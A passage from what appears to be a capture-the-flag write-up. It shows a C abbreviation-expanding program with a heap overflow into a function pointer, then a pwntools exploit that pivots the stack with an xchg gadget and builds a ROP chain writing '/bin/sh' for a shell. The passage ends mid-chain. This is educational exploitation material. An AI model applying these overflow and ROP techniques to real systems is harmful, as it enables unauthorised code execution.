</span><span class="cp">#include</span> <span class="cpf">&#34;rules.h&#34;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Translator</span> <span class="p">{</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">translate</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">);</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Translator</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">english_expand</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">alen</span><span class="p">,</span> <span class="n">blen</span><span class="p">;</span>
  <span class="n">Rule</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">text</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// pointer to the last character
</span><span class="c1"></span>
  <span class="cm">/* Replace all abbreviations */</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="o">++</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rules</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Rule</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rules</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      <span class="n">alen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
      <span class="n">blen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">strncasecmp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">,</span> <span class="n">alen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
</span><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span> <span class="n">q</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">;</span> <span class="o">--</span><span class="n">q</span><span class="p">)</span>
          <span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">+</span><span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
        <span class="c1">// Update end
</span><span class="c1"></span>        <span class="n">end</span> <span class="o">+=</span> <span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
        <span class="c1">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
</span><span class="c1"></span>        <span class="n">memcpy</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">,</span> <span class="n">blen</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="n">Translator</span> <span class="o">*</span><span class="nf">translator_new</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>

  <span class="cm">/* Allocate region for text */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">text</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="cm">/* Initialize translator */</span>
  <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">Translator</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Translator</span><span class="p">));</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span> <span class="o">=</span> <span class="n">english_expand</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">translator_reset</span><span class="p">(</span><span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>

  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="n">translator_new</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Input data */</span>
    <span class="n">translator_reset</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter text: &#34;</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="cm">/* Expand abbreviation */</span>
    <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %s&#34;</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The <code>rules.h</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
</span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>

<span class="c1">// Why are there so many abbreviations in English!!?? :exploding_head:
</span><span class="c1"></span><span class="n">Rule</span> <span class="n">rules</span><span class="p">[]</span> <span class="o">=</span>
  <span class="p">{</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;2f4u&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;too fast for you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;4yeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aamof&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as a matter of fact&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afaik&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as far as i know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;away from keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;also known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b2k&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to topic&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;by the way&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b/c&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;because&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;c&amp;p&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;copy and paste&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cys&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;check your settings&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;diy&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;do it yourself&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;eobd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;end of business day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;faq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;frequently asked questions&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;formerly known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fwiw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for what it&#39;s worth&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jfyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;just for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;have fun&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hth&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;hope this helps&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;idk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;i don&#39;t know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iirc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;if i remember correctly&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imnsho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my not so humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iow&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in other words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;itt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in this thread&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;dgmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;don&#39;t get me wrong&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;mmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;mark my words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nntr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no need to reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;newbie&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noyb&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;none of your business&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nrn&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no reply necessary&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;otoh&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;on the other hand&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rtfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;read the fine manual&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;scnr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry, could not resist&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;sflr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry for late reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tba&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be announced&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tbc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be continued&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tia&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thanks in advance&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyvm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you very much&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;take your time&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ttyl&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;talk to you later&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;works for me&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wtf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;what the fuck&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wrt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;with regard to&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ymmd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;you made my day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;icymi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in case you missed it&#34;</span><span class="p">},</span>
   <span class="c1">// pwners abbreviations
</span><span class="c1"></span>   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;jump oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;call oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aar&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address read&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aaw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address write&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;www&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;write what where&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;oob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;out of bounds&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ret2&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return to &#34;</span><span class="p">},</span>
  <span class="p">};</span>
</code></pre></div><p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
An interesting abbreviation is the <code>www</code>, which stands for &ldquo;write what where&rdquo; (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain-1">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain-1" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain-1">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
Lets take a look at the values of the registers when we trigger the function pointer:</p>
<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
 RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
 RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
 R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 R9   0x0
 R10  0x49e522 ◂— 'Enter text: '
 R11  0x246
 R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
 R13  0x0
 R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
 R15  0x0
 RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
 RSP  0x7ffdef1b8220 ◂— 0x0
 RIP  0x402036 (main+190) ◂— call   rdx
</code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
